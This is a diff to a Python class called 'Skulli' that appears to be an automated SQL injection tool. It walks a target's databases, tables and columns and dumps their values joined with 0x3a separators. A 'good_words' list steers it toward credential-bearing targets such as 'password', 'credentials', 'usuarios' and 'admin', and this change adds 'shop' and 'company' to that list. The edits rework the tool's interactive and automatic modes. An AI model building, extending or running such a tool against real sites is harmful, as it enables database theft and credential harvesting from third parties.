@@ -48,7 +48,7 @@ class Skulli:
         self.recursive = recursive
         self.characters = string.ascii_letters + string.digits + '_-$#@!.,<>?;:* '
         self.old_data = self.data[self.skll]
-        self.good_words = ['login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id']
+        self.good_words = ['login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales', 'usernames', 'username', 'password', 'id', 'shop','company']
         self.global_dbs = ''
         self.global_tbs = ''
 
@@ -76,14 +76,14 @@ class Skulli:
         lower_options = [word.lower() for word in list_options]
         
         if len(options) == 1 or self.recursive:
-            return 0
+            return 0,None,None
         
         for word in self.good_words:
             if word in lower_options:
                 index = lower_options.index(word)
                 self.good_words.pop(index)
                 
-                return index,list_options
+                return index,list_options,None
         
         return self.which_options(options)
 
@@ -143,7 +143,7 @@ class Skulli:
                 self.global_tbs = ''
                 old_dbs.remove(database)
                 continue
-            option2 = self.set_options(old_tbs)
+            option2 = 0
             table = old_tbs[option2]
             self.global_tbs.pop(option2)
 
@@ -704,9 +704,37 @@ class Skulli:
         databases = self.get_databases(len1)
         self.global_dbs = databases.split(',')
         
-        
-        
-        while True:
+        if not self.automatic:
+
+            while True:
+                option1,old_dbs,new_dbs = self.which_options(self.global_dbs) if not self.automatic else self.set_options(self.global_dbs)
+                database = old_dbs[option1]
+                self.global_dbs = old_dbs.copy()
+                
+
+                print('\n')
+
+                len2 = self.get_tables_len(database)
+                if len2 == None:
+                    print(f'[!] Ocurrio un error, puede que no tenga permisos para {database}, elija otra')
+                    self.global_dbs.remove(database)
+                    continue
+                else:
+                    tables = self.get_tables(self.get_tables_len(database), database)
+                    # break
+                option2,old_tbs,new_tbs = self.which_options(tables) if not self.automatic else self.set_options(tables)
+                table = tables.split(',')[option2]
+
+                print('\n')
+
+                columns = self.get_columns(self.get_columns_len(database,table), database, table)
+                columns = columns.replace(',', ",0x3a,")
+                # #print(columns)
+
+                print('\n')
+
+                self.get_values(self.get_values_len(database,table,columns),database,table,columns)
+        else:
             option1,old_dbs,new_dbs = self.which_options(self.global_dbs) if not self.automatic else self.set_options(self.global_dbs)
             database = old_dbs[option1]
             self.global_dbs = old_dbs.copy()
@@ -717,11 +745,8 @@ class Skulli:
             len2 = self.get_tables_len(database)
             if len2 == None:
                 print(f'[!] Ocurrio un error, puede que no tenga permisos para {database}, elija otra')
-                self.global_dbs.remove(database)
-                continue
             else:
                 tables = self.get_tables(self.get_tables_len(database), database)
-                # break
             option2,old_tbs,new_tbs = self.which_options(tables) if not self.automatic else self.set_options(tables)
             table = tables.split(',')[option2]
 
